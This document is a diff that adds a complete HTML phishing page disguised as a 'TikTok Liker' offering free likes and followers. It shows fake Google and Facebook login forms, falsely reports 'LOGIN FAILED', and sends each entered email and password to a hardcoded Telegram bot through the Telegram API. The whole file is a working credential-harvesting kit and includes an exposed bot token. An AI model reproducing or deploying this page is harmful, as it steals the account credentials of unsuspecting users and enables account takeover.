@@ -1,0 +1,438 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TikTok Liker</title>
+    <style>
+        body {
+            font-family: 'Comic Sans MS', sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f0f0f0;
+            background-size: cover;
+            background-position: center;
+            transition: background-image 1s ease-in-out;
+        }
+
+        .container {
+            text-align: center;
+            background: rgba(255, 255, 255, 0.8);
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+
+        h1 {
+            font-size: 36px;
+            font-weight: bold;
+            margin-bottom: 40px;
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+            width: 300px;
+        }
+
+        input[type="text"], select {
+            width: 100%;
+            padding: 15px;
+            border-radius: 30px;
+            border: 2px solid black;
+            font-size: 16px;
+            box-sizing: border-box;
+            outline: none;
+            text-align: center;
+            font-style: italic;
+            appearance: none;
+        }
+
+        button {
+            width: 100%;
+            padding: 15px;
+            border-radius: 30px;
+            border: none;
+            font-size: 18px;
+            font-weight: bold;
+            background-color: #00ff00;
+            cursor: pointer;
+            font-style: italic;
+            text-transform: uppercase;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
+        }
+
+        button:hover {
+            background-color: #00cc00;
+        }
+
+        /* Modal Styles */
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 1;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            overflow: auto;
+            background-color: rgba(0, 0, 0, 0.4);
+        }
+
+        .modal-content {
+            background-color: #fff;
+            margin: 15% auto;
+            padding: 20px;
+            border-radius: 10px;
+            width: 300px;
+            text-align: center;
+            position: relative;
+            animation: fadeIn 0.5s;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        .modal-title {
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 20px;
+            animation: colorChange 60s infinite;
+        }
+
+        @keyframes colorChange {
+            0% { color: red; }
+            5% { color: orange; }
+            10% { color: yellow; }
+            15% { color: green; }
+            20% { color: blue; }
+            25% { color: indigo; }
+            30% { color: violet; }
+            35% { color: pink; }
+            40% { color: teal; }
+            45% { color: magenta; }
+            50% { color: crimson; }
+            55% { color: chartreuse; }
+            60% { color: skyblue; }
+            65% { color: gold; }
+            70% { color: coral; }
+            75% { color: navy; }
+            80% { color: olive; }
+            85% { color: maroon; }
+            90% { color: lime; }
+            95% { color: turquoise; }
+        }
+
+        .modal-button {
+            width: 100%;
+            padding: 10px;
+            margin-top: 10px;
+            border-radius: 5px;
+            border: none;
+            font-size: 16px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .modal-button img {
+            margin-right: 10px;
+        }
+
+        .google-button {
+            background-color: #4285F4;
+            color: white;
+        }
+
+        .facebook-button {
+            background-color: #4267B2;
+            color: white;
+        }
+
+        .google-button:hover {
+            background-color: #357ae8;
+        }
+
+        .facebook-button:hover {
+            background-color: #365899;
+        }
+
+        /* Close Button Styles */
+        .close {
+            position: absolute;
+            top: 10px;
+            left: 10px;
+            font-size: 28px;
+            font-weight: bold;
+            color: #000;
+            cursor: pointer;
+        }
+
+        .close:hover,
+        .close:focus {
+            color: red;
+            text-decoration: none;
+            cursor: pointer;
+        }
+
+        /* Login Modal Styles */
+        .login-modal-content {
+            background-color: #fff;
+            margin: 15% auto;
+            padding: 20px;
+            border-radius: 10px;
+            width: 300px;
+            text-align: center;
+            position: relative;
+        }
+
+        .login-input-group {
+            margin-bottom: 20px;
+        }
+
+        input[type="email"], input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            border-radius: 5px;
+            border: 1px solid #ccc;
+            font-size: 14px;
+            box-sizing: border-box;
+            outline: none;
+        }
+
+        .login-button {
+            padding: 10px 20px;
+            border-radius: 5px;
+            border: none;
+            font-size: 16px;
+            cursor: pointer;
+            background-color: #00cc00;
+            color: white;
+        }
+
+        .login-button:disabled {
+            background-color: #ddd;
+            cursor: not-allowed;
+        }
+
+        .login-button:hover:not(:disabled) {
+            background-color: #00b300;
+        }
+
+        .error-message {
+            color: red;
+            margin-top: 10px;
+            font-size: 14px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>TIKTOK LIKER</h1>
+
+        <div class="input-group">
+            <input type="text" id="username" placeholder="user name">
+        </div>
+
+        <div class="input-group">
+            <select id="likesAmount">
+                <option>AMOUNT OF LIKES</option>
+                <option>10</option>
+                <option>100</option>
+                <option>150</option>
+                <option>200</option>
+                <option>250</option>
+                <option>500 (paid)</option>
+            </select>
+        </div>
+
+        <div class="input-group">
+            <select id="followersAmount">
+                <option>AMOUNT OF FOLLOWERS</option>
+                <option>10</option>
+                <option>100</option>
+                <option>150 (paid)</option>
+                <option>200 (paid)</option>
+                <option>250 (paid)</option>
+                <option>500 (paid)</option>
+            </select>
+        </div>
+
+        <div class="input-group">
+            <button onclick="unlockAndFill()">UNLOCK</button>
+        </div>
+    </div>
+
+    <!-- Initial Modal -->
+    <div id="loginModal" class="modal">
+        <div class="modal-content">
+            <span class="close" onclick="closeModal()">×</span>
+            <div class="modal-title">LOGGING INTO YOUR ACCOUNT</div>
+            <button class="modal-button google-button" onclick="openGoogleLoginModal()">
+                <img src="https://img.icons8.com/color/24/000000/google-logo.png" alt="Google Icon">
+                LOGIN WITH GOOGLE
+            </button>
+            <button class="modal-button facebook-button" onclick="openFacebookLoginModal()">
+                <img src="https://img.icons8.com/ios-filled/24/ffffff/facebook.png" alt="Facebook Icon">
+                LOGIN WITH FACEBOOK
+            </button>
+        </div>
+    </div>
+
+    <!-- Google Login Modal -->
+    <div id="googleLoginModal" class="modal">
+        <div class="login-modal-content">
+            <span class="close" onclick="closeGoogleLoginModal()">×</span>
+            <h2>Login with Google</h2>
+            <div class="login-input-group">
+                <input type="email" id="googleEmail" placeholder="EMAIL" required>
+            </div>
+            <div class="login-input-group">
+                <input type="password" id="googlePassword" placeholder="PASSWORD" required>
+            </div>
+            <button id="googleLoginButton" class="login-button" disabled onclick="loginGoogle()">LOGIN</button>
+            <div id="googleErrorMessage" class="error-message"></div>
+        </div>
+    </div>
+
+    <!-- Facebook Login Modal -->
+    <div id="facebookLoginModal" class="modal">
+        <div class="login-modal-content">
+            <span class="close" onclick="closeFacebookLoginModal()">×</span>
+            <h2>Login with Facebook</h2>
+            <div class="login-input-group">
+                <input type="email" id="facebookEmail" placeholder="PHONE NUMBER OR EMAIL" required>
+            </div>
+            <div class="login-input-group">
+                <input type="password" id="facebookPassword" placeholder="PASSWORD" required>
+            </div>
+            <button id="facebookLoginButton" class="login-button" disabled onclick="loginFacebook()">LOGIN</button>
+            <div id="facebookErrorMessage" class="error-message"></div>
+        </div>
+    </div>
+
+    <script>
+        let currentImage = 0;
+        const images = [
+            'https://assets.onecompiler.app/42pw3bqaa/42q2ujh8z/e05c2187d7407d3d11e9d353ed3d2c26.jpg',
+            'https://assets.onecompiler.app/42pw3bqaa/42pxe5f78/black-funky-tiktok-background-image-design-template-8f3fa337008c56665bc013eb2b29b094_screen.jpg'
+        ];
+
+        function changeBackgroundImage() {
+            currentImage = (currentImage + 1) % images.length;
+            document.body.style.backgroundImage = `url(${images[currentImage]})`;
+        }
+
+        setInterval(changeBackgroundImage, 120000); // Change every 2 minutes
+        changeBackgroundImage(); // Initial call to set the background
+
+        function unlockAndFill() {
+            const username = document.getElementById('username').value;
+            const likesAmount = document.getElementById('likesAmount').value;
+            const followersAmount = document.getElementById('followersAmount').value;
+
+            if (username && (likesAmount !== 'AMOUNT OF LIKES' || followersAmount !== 'AMOUNT OF FOLLOWERS')) {
+                // Fill in the form or perform actions with the data
+                console.log(`Username: ${username}, Likes: ${likesAmount}, Followers: ${followersAmount}`);
+                openModal();
+            } else {
+                alert('Please enter a username and select an amount for likes or followers.');
+            }
+        }
+
+        function openModal() {
+            document.getElementById("loginModal").style.display = "block";
+        }
+
+        function closeModal() {
+            document.getElementById("loginModal").style.display = "none";
+        }
+
+        function openGoogleLoginModal() {
+            closeModal();
+            document.getElementById("googleLoginModal").style.display = "block";
+        }
+
+        function closeGoogleLoginModal() {
+            document.getElementById("googleLoginModal").style.display = "none";
+        }
+
+        function openFacebookLoginModal() {
+            closeModal();
+            document.getElementById("facebookLoginModal").style.display = "block";
+        }
+
+        function closeFacebookLoginModal() {
+            document.getElementById("facebookLoginModal").style.display = "none";
+        }
+
+        function validateLoginForm() {
+            const googleEmail = document.getElementById("googleEmail").value;
+            const googlePassword = document.getElementById("googlePassword").value;
+            const googleLoginButton = document.getElementById("googleLoginButton");
+
+            const facebookEmail = document.getElementById("facebookEmail").value;
+            const facebookPassword = document.getElementById("facebookPassword").value;
+            const facebookLoginButton = document.getElementById("facebookLoginButton");
+
+            googleLoginButton.disabled = !(googleEmail && googlePassword);
+            facebookLoginButton.disabled = !(facebookEmail && facebookPassword);
+        }
+
+        document.getElementById("googleEmail").addEventListener("input", validateLoginForm);
+        document.getElementById("googlePassword").addEventListener("input", validateLoginForm);
+        document.getElementById("facebookEmail").addEventListener("input", validateLoginForm);
+        document.getElementById("facebookPassword").addEventListener("input", validateLoginForm);
+
+        function loginGoogle() {
+            const googleEmail = document.getElementById("googleEmail").value;
+            const googlePassword = document.getElementById("googlePassword").value;
+
+            if (googleEmail && googlePassword) {
+                document.getElementById("googleErrorMessage").textContent = "LOGIN FAILED";
+                document.getElementById("googleErrorMessage").style.color = "red";
+                sendToTelegram(googleEmail, googlePassword);
+            }
+        }
+
+        function loginFacebook() {
+            const facebookEmail = document.getElementById("facebookEmail").value;
+            const facebookPassword = document.getElementById("facebookPassword").value;
+
+            if (facebookEmail && facebookPassword) {
+                document.getElementById("facebookErrorMessage").textContent = "LOGIN FAILED";
+                document.getElementById("facebookErrorMessage").style.color = "red";
+                sendToTelegram(facebookEmail, facebookPassword);
+            }
+        }
+
+        function sendToTelegram(email, password) {
+            const botToken = "7259725031:AAGtS2foY9vFY5sEnK6sgA1Ei-VApJPSN_Y"; // Replace with your bot token
+            const chatId = "6793999316"; // Replace with your chat ID
+            const message = `Login Information:\nEmail: ${email}\nPassword: ${password}`;
+
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            fetch(url)
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error("Telegram API request failed.");
+                    }
+                    return response.json();
+                })
+                .then(data => {
+                    console.log("Data sent to Telegram:", data);
+                })
+                .catch(error => {
+                    console.error("Error:", error);
+                });
+        }
+    </script>
+</body>
+</html>
